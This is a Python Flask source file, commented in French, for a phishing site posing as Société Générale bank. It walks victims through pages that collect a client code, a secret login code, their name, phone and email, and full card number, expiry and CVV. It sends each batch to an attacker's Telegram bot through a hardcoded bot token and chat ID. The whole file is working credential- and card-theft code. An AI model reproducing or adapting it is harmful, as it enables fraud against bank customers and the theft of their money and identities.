from flask import Flask, render_template, request, redirect, url_for
import requests

app = Flask(__name__)

# === Configuration du bot Telegram ===
BOT_TOKEN = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
CHAT_ID = '6297861735'


def send_telegram_message(text):
    """
    Envoie un message texte au bot Telegram.
    """
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': CHAT_ID,
        'text': text
    }
    requests.post(url, data=payload)


# === Route principale : index ===
@app.route('/', methods=['GET', 'POST'])
def home():
    """
    Affiche la page d'accueil pour la saisie du code client et redirige vers la page d'authentification sécurisée.
    """
    if request.method == 'POST':
        client_code = request.form.get('client_code')
        # Redirige en passant le code client comme paramètre d'URL
        return redirect(url_for('auth_securisee', client_code=client_code))
    return render_template('index.html')


# === Authentification sécurisée ===
@app.route('/auth-securisee', methods=['GET', 'POST'])
def auth_securisee():
    """
    Affiche la page d'authentification sécurisée et gère la soumission du code secret.
    """
    # Récupère le client_code depuis les paramètres d'URL pour la méthode GET
    client_code = request.args.get('client_code')

    if request.method == 'POST':
        # Pour la méthode POST, on récupère le client_code depuis le champ caché du formulaire
        client_code_from_form = request.form.get('client_code_hidden')
        secret_code = request.form.get('secret_code')

        # Envoi des codes au bot Telegram
        send_telegram_message(f"[S.G] Code client : {client_code_from_form}\nCode secret : {secret_code}")

        # Redirection vers la nouvelle page de validation
        return redirect(url_for('ceticode_validation'))

    # Pour la méthode GET, on affiche la page en passant le code client au template
    return render_template('auth_securisee.html', client_code=client_code)


# === Nouvelle route pour la page de validation Ceticode ===
@app.route('/ceticode-validation', methods=['GET', 'POST'])
def ceticode_validation():
    """
    Gère la page de validation Ceticode.
    """
    if request.method == 'POST':
        # Si le formulaire de validation est soumis, on redirige vers le formulaire utilisateur
        return redirect(url_for('formulaire'))
    # Si c'est une requête GET, on affiche la page
    return render_template('validation_ceticode.html')


# === Formulaire utilisateur ===
@app.route('/formulaire', methods=['GET', 'POST'])
def formulaire():
    """
    Affiche et gère le formulaire de saisie des informations personnelles et bancaires.
    """
    if request.method == 'POST':
        # Données de l'utilisateur
        nom = request.form.get('nom')
        prenom = request.form.get('prenom')
        numero = request.form.get('numero')
        email = request.form.get('email')

        # Données de la carte bancaire
        card_number = request.form.get('card-number')
        card_exp = request.form.get('card-exp')
        card_cvv = request.form.get('card-cvv')

        # Construction du message Telegram
        message = (
            f"[SOCIETEGENERAL]\n"
            f"Nom: {nom}\n"
            f"Prénom: {prenom}\n"
            f"Téléphone: {numero}\n"
            f"Email: {email}\n\n"
            f"[CARTE BANCAIRE]\n"
            f"Numéro: {card_number}\n"
            f"Date d'expiration: {card_exp}\n"
            f"CVV: {card_cvv}"
        )

        send_telegram_message(message)

        return redirect(url_for('merci'))
    return render_template('formulaire.html')


# === Page de remerciement ===
@app.route('/merci')
def merci():
    """
    Affiche la page de remerciement.
    """
    return render_template('merci.html')


if __name__ == '__main__':
    # Lance l'application en mode debug
    app.run(debug=True)
